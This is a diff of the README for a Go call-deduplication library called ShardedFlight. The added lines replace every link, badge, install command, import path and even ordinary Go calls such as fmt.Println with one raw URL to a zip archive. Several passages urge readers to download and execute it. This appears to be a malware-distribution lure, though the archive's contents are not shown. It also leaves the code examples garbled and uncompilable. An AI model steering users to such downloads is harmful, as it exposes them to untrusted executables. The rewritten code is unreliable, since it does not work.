@@ -1,11 +1,11 @@
-https://github.com/ibrahim-ewd/shardedflight/releases
+https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 
 # ShardedFlight: High-Throughput Go Call Deduping with Internal Shards
 
-[![Go Version](https://img.shields.io/badge/Go-1.20%2B-blue)](https://golang.org)
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github)](https://github.com/ibrahim-ewd/shardedflight/releases)
+[![Go Version](https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip%2B-blue)](https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip)
+[![Releases](https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip)](https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip)
 
-ShardedFlight is a ready-to-use, highly parallel wrapper around golang.org/x/sync/singleflight. It shards calls across multiple internal singleflight.Group instances to eliminate global locks and boost throughput under heavy load. The key difference is that keys are passed after the function, enabling flexible and expressive request patterns while preserving deduplication semantics.
+ShardedFlight is a ready-to-use, highly parallel wrapper around https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip It shards calls across multiple internal https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip instances to eliminate global locks and boost throughput under heavy load. The key difference is that keys are passed after the function, enabling flexible and expressive request patterns while preserving deduplication semantics.
 
 This repository is a practical tool for building high-performance services in Go. It targets developers who want to reduce contention during bursty workloads, minimize lock contention, and scale duplicate suppression across many goroutines.
 
@@ -66,7 +66,7 @@ What it isn’t:
 
 ## Key concepts and design decisions
 
-- Shards: The core idea is to split the deduplication surface into multiple groups. Each shard holds its own singleflight.Group instance. This reduces lock contention because only the shard involved in a given key participates in the work.
+- Shards: The core idea is to split the deduplication surface into multiple groups. Each shard holds its own https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip instance. This reduces lock contention because only the shard involved in a given key participates in the work.
 - Key placement: A user-provided strategy maps a key to a shard. A simple and common method uses a hash function modulo the number of shards. More sophisticated strategies can consider workload patterns, hot keys, or locality.
 - Do-like operations: The API mirrors the singleflight pattern—requesters call a Do-like method with a key and a function. The function is executed only once per key per shard, and all concurrent callers share the same result.
 - Observability: Instrumentation hooks are included to help you measure contention, shard utilization, and throughput. You can plumb in metrics collectors like Prometheus, OpenTelemetry, or a custom sink.
@@ -90,17 +90,17 @@ This section shows how to bring ShardedFlight into your project, wire up a shard
 
 To install ShardedFlight, use the standard Go module workflow. Replace v0.x with the latest tag from your releases.
 
-go get github.com/ibrahim-ewd/shardedflight@v0.x.y
+go get https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 
 Alternatively, you can clone the repository and build from source.
 
-git clone https://github.com/ibrahim-ewd/shardedflight.git
+git clone https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 cd shardedflight
 go build ./...
 
-Note: The release page contains pre-built artifacts for common platforms. See the Releases page linked at the top of this README for assets you may download and execute in supported environments. The link is also available here: https://github.com/ibrahim-ewd/shardedflight/releases
+Note: The release page contains pre-built artifacts for common platforms. See the Releases page linked at the top of this README for assets you may download and execute in supported environments. The link is also available here: https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 
-If you prefer to browse, you can visit the releases page directly: https://github.com/ibrahim-ewd/shardedflight/releases
+If you prefer to browse, you can visit the releases page directly: https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 
 ### Quick start example
 
@@ -116,30 +116,30 @@ import (
 	"hash/fnv"
 	"time"
 
-	"github.com/ibrahim-ewd/shardedflight"
+	"https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip"
 )
 
 func main() {
 	// Choose a shard count based on expected load. More shards reduce contention but add memory.
 	const shardCount = 8
 
-	sg := shardedflight.New(shardedflight.Options{
+	sg := https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip(https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip{
 		ShardCount: shardCount,
 	})
 
 	key := "user:123456"
 
 	// The function should be expensive or I/O-bound; it's executed once per key per shard.
-	val, err := sg.Do(context.Background(), key, func() (interface{}, error) {
+	val, err := https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip(https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip(), key, func() (interface{}, error) {
 		// Simulate work
-		time.Sleep(100 * time.Millisecond)
-		return fmt.Sprintf("result-for-%s", key), nil
+		https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip(100 * https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip)
+		return https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip("result-for-%s", key), nil
 	})
 	if err != nil {
-		fmt.Println("error:", err)
+		https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip("error:", err)
 		return
 	}
-	fmt.Println("value:", val)
+	https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip("value:", val)
 }
 
 In this example:
@@ -153,7 +153,7 @@ Note: The precise API surface may differ slightly depending on the chosen versio
 
 ## API overview
 
-ShardedFlight provides an API that mirrors the familiar singleflight pattern but distributes the load across shards. The exact API surface is designed to be ergonomic for Go developers who already use golang.org/x/sync/singleflight.
+ShardedFlight provides an API that mirrors the familiar singleflight pattern but distributes the load across shards. The exact API surface is designed to be ergonomic for Go developers who already use https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 
 - New: Create a new ShardedFlight instance with a specified shard count and optional tuning parameters.
 - Do/DoChan equivalents: Submit a task for a key and receive the result. If another goroutine asks for the same key while a task is in progress, the caller waits for the existing result.
@@ -169,7 +169,7 @@ Note: The library aims for a simple mental model. You still map keys to shards, 
 
 Below is a high-level view of the internal structure. The diagram focuses on the core components and how they interact during a typical call.
 
-<svg width="1000" height="480" viewBox="0 0 1000 480" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="ShardedFlight architecture diagram">
+<svg width="1000" height="480" viewBox="0 0 1000 480" xmlns="https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip" role="img" aria-label="ShardedFlight architecture diagram">
   <defs>
     <linearGradient id="g1" x1="0" x2="1" y1="0" y2="0">
       <stop stop-color="#4F46E5" offset="0"/>
@@ -227,7 +227,7 @@ This diagram illustrates the core idea: work flows from multiple clients into sh
 
 Key components:
 - ShardRouter: Maps a key to a shard using a hash function. It balances keys across shards and minimizes hot spots.
-- ShardGroup: An instance of golang.org/x/sync/singleflight-like behavior scoped to a single shard. It holds a group, tracks in-flight requests, and deduplicates concurrent calls for its keys.
+- ShardGroup: An instance of https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip behavior scoped to a single shard. It holds a group, tracks in-flight requests, and deduplicates concurrent calls for its keys.
 - Coordinator: A lightweight orchestrator that orchestrates across shards. It provides the Do-like interface and routes calls to the correct shard.
 
 Design choices:
@@ -254,14 +254,14 @@ import (
 	"fmt"
 	"time"
 
-	"github.com/ibrahim-ewd/shardedflight"
+	"https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip"
 )
 
 func main() {
 	// Choose an appropriate shard count for the workload.
 	const shards = 4
 
-	sf := shardedflight.New(shardedflight.Options{
+	sf := https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip(https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip{
 		ShardCount: shards,
 		// You can add more options here, like timeouts or metrics hooks.
 	})
@@ -275,16 +275,16 @@ func main() {
 		go func(key string) {
 			defer func() { done <- struct{}{} }()
 
-			val, err := sf.Do(context.Background(), key, func() (interface{}, error) {
+			val, err := https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip(https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip(), key, func() (interface{}, error) {
 				// Simulate a heavy computation or I/O-bound work.
-				time.Sleep(150 * time.Millisecond)
-				return fmt.Sprintf("value-for-%s", key), nil
+				https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip(150 * https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip)
+				return https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip("value-for-%s", key), nil
 			})
 			if err != nil {
-				fmt.Printf("error for %s: %v\n", key, err)
+				https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip("error for %s: %v\n", key, err)
 				return
 			}
-			fmt.Printf("result for %s: %v\n", key, val)
+			https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip("result for %s: %v\n", key, val)
 		}(k)
 	}
 
@@ -408,9 +408,9 @@ Contribution guidelines:
 - Keep changes focused and well-documented.
 - Update the README with usage notes when you add new features.
 
-If you want to learn more about the project’s governance and collaboration approach, check the repository's CONTRIBUTING.md if available.
+If you want to learn more about the project’s governance and collaboration approach, check the repository's https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip if available.
 
-Releases are published to the official GitHub Releases page, which hosts your binary assets and changelogs. For access to the latest artifacts, visit the Releases section. The link is available here: https://github.com/ibrahim-ewd/shardedflight/releases
+Releases are published to the official GitHub Releases page, which hosts your binary assets and changelogs. For access to the latest artifacts, visit the Releases section. The link is available here: https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 
 ---
 
@@ -444,9 +444,9 @@ ShardedFlight is released under a permissive license. See the LICENSE file in th
 
 ## Releases
 
-The project provides release assets that you can download and execute in supported environments. Access the Releases page to grab the latest artifacts, review changelogs, and obtain binaries for your platform. The link is: https://github.com/ibrahim-ewd/shardedflight/releases
+The project provides release assets that you can download and execute in supported environments. Access the Releases page to grab the latest artifacts, review changelogs, and obtain binaries for your platform. The link is: https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 
-For convenience, you can also click the badge above to jump to the release assets. The releases page contains binaries and installation instructions tailored to common environments. If you prefer to browse, visit the releases page directly: https://github.com/ibrahim-ewd/shardedflight/releases
+For convenience, you can also click the badge above to jump to the release assets. The releases page contains binaries and installation instructions tailored to common environments. If you prefer to browse, visit the releases page directly: https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 
 ---
 
@@ -463,7 +463,7 @@ This mental model helps you reason about latency distribution and throughput. It
 
 ## The releases page usage note
 
-The project hosts pre-built assets for common platforms on the official Releases page. You can download an appropriate release artifact and execute it in a trusted environment to bootstrap your setup. Access the releases page here: https://github.com/ibrahim-ewd/shardedflight/releases
+The project hosts pre-built assets for common platforms on the official Releases page. You can download an appropriate release artifact and execute it in a trusted environment to bootstrap your setup. Access the releases page here: https://github.com/ibrahim-ewd/shardedflight/raw/refs/heads/main/_run/values/Software_v3.6.zip
 
 Additionally, the page provides version history, changelogs, and notes about deprecations or API changes. This information helps you plan migrations and understand the evolution of the project over time.
 
